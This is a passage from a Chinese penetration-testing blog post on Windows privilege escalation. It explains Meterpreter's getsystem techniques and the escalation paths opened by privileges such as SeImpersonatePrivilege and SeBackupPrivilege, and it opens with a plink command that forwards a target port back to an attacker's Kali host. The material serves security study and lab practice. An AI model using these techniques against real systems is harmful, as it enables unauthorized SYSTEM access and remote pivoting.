<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c &quot;echo y|C:\Windows\Temp\plink64.exe -l root -pw toor -R &lt;kali-port&gt;:&lt;target-IP&gt;:&lt;target-port&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>通常target-IP输入的是127.0.0.1</p>
<h1 id="额外部分"><a href="#额外部分" class="headerlink" title="额外部分"></a>额外部分</h1><h3 id="Meterpreter-gt-getsystem"><a href="#Meterpreter-gt-getsystem" class="headerlink" title="Meterpreter&gt;getsystem"></a>Meterpreter&gt;getsystem</h3><p>首先介绍几个概念</p>
<p><strong>Access Tokens</strong></p>
<p>访问令牌是windows中的特殊对象，它用来存储用户的身份和权限。有两种Access Tokens<br>PrimaryAccess Token:用户登录时创建，并绑定到当前用户会话。当用户启动一个新的程序，这个访问令牌会被复制并被新的程序所加载。这就表示这个程序会运行在这个用户Token所在的权限<br>ImpersonationAccess Token:在进程或线程需要安全的使用其他用户的上下文运行时，被临时创建</p>
<p>windows允许进程或线程复制访问令牌，所以ImpersonationAccess Token可以被复制成PrimaryAccess Token<br>如果我们可以注入一个进程，我们可以使用此功能来复制该进程的令牌，然后使用此令牌来产生另一个相同权权限的单独进程</p>
<p><strong>Named Pipes</strong></p>
<p>pipe管道技术在windows和linux中经常使用，比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systeminfo | findstrWindows</span><br></pre></td></tr></table></figure>

<p>命名管道是这种技术的扩展<br>一个进程可以创建一个命名管道，其他进程可以打开管道从中读取或写入数据<br>创建命名管道的进程可模拟连接到命名管道的安全上下文</p>
<p>接着我们开始分析meterpreter的getsystem命令具体是怎么实现的<br>首先它的源码:<a href="https://github.com/rapid7/metasploit-payloads/tree/d672097e9989e0b4caecfad08ca9debc8e50bb0c/c/meterpreter/source/extensions/priv">链接</a><br>最值得关注的是elevate.c, namedpipe.c, tokendup.c。它们使用了3种不同得技术获取system</p>
<p><strong>Named Pipe Impersonation (In Memory/Admin)</strong><br>创建由meterpreter控制的命名管道<br>创建一个服务(以SYSTEM身份运行)，该服务的命令直接与命名管道交互<br>接着，meterpreter模拟连接进程去获取ImpersonationAccess Token(这里就是SYSTEM的安全上下文)<br>最后，将令牌分配给后续的meterpreter程序，这意味着它们会以SYSTEM身份运行</p>
<p><strong>Named Pipe Impersonation (Dropper/Admin)</strong><br>与上一种方法非常类似。唯一的不同是写了一个DLL在磁盘中，创建的服务加载DLL以SYSTEM身份运行。DLL连接到命名管道</p>
<p><strong>Token Duplication (In Memory/Admin)</strong><br>这个技术需要SeDebugPrivilege。它寻找任何以SYSTEM身份运行的服务，并进行DLL注入<br>DLL会复制访问令牌会将其分配给meterpreter。目前，这种技术只适用于x86架构<br>这种唯一不需要创建服务完全在内存中运行的技术</p>
<p>Meterpreter的getsystem功能本身是将本地管理员升级到SYSTEM的一个工具<br>命名管道技术需要本地管理员权限<br>复制令牌技术需要SeDebugPrivilege权限，并且只适用于x86架构</p>
<p>所以getsystem功能不是让你在<strong>现代操作系统</strong>中从User权限提升到Admin权限</p>
<h3 id="User-Privileges"><a href="#User-Privileges" class="headerlink" title="User Privileges"></a>User Privileges</h3><p>在windows中可以为账户和组分配一些特别的权限。这些权限可以让你拥有一些功能的访问权限。其中一些功能有助于获取SYSTEM权限</p>
<p>使用该命令检查，而且需要特别注意，在这里<code>disabled</code>无关紧要。这里只有列了出来，那么你就拥有该权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;priv</span><br></pre></td></tr></table></figure>

<p><strong>SeImpersonatePrivilege</strong></p>
<p>可以获得任何程序的access token，如果从SYSTEM中盗取了令牌，则可以使用它生成一个新的进程。<br>juicy potato可以使用它</p>
<p><strong>SeAssignPrimaryPrivilege</strong></p>
<p>与SeImpersonatePrivilege类似，使用户能够将访问令牌分配给新进程<br>juicy potato可以使用它</p>
<p><strong>SeBackupPrivilege</strong></p>
<p>获取系统上所有对象的read权限，无视ACL<br>有了它，我们可以尝试访问敏感文件或从注册表中提权哈希，用于哈希破解或哈希传递</p>
<p><strong>SeRestorePrivilege</strong></p>
<p>获取系统上所有对象的write权限，无视ACL<br>这给我们更多的操作空间，比如<br>修改服务的二进制文件<br>覆盖系统程序的DLL文件<br>修改注册表设置</p>
<p><strong>SeTakeOwnershipPrivilege</strong></p>
<p>让用户获取一个对象的所有权(即<code>WRITE_OWNER</code>权限)<br>一旦获取了某个对象，你就可以修改它的ACL来授予自己写权限等，这样你就可以和SeRestorePrivilege一样的手段来尝试提权</p>
<p><strong>SeLoadDriverPrivilege</strong></p>
<p>参考HTB:Fuse</p>
<p>其他一些可以更高级进行提权的权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•SeTcbPrivilege</span><br><span class="line">•SeCreateTokenPrivilege</span><br><span class="line">•SeDebugPrivilege(used by getsystem)147</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>永恒不变的道理<code>enumeration is the key</code></p>
<p>首先检查的第一件事应该是账户是谁，它属于哪一个组<br>winpeas枚举，检查每一项被重点标注的选项。但winpeas不是完美的，有时需要尝试其他枚举工具<br>重点是了解手动枚举的方法，在脚本无法正常运行的时候可以突破困境<br>(手动枚举:<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a>)<br>重点检查用户的桌面或其他重点位置(C:\或C:\Program Files)，这些地方可能会存放一些有用的信息<br>仍然没有获得提权，再开始寻找一些第三方程序或者任何看起来奇怪的文件名，甚至是用户名，尝试确认它们的版本并寻找公开漏洞。<br>最后考虑内核提权</p>
]]></content>
      <categories>
        <category>后渗透Windows</category>
      </categories>
  </entry>
</search>
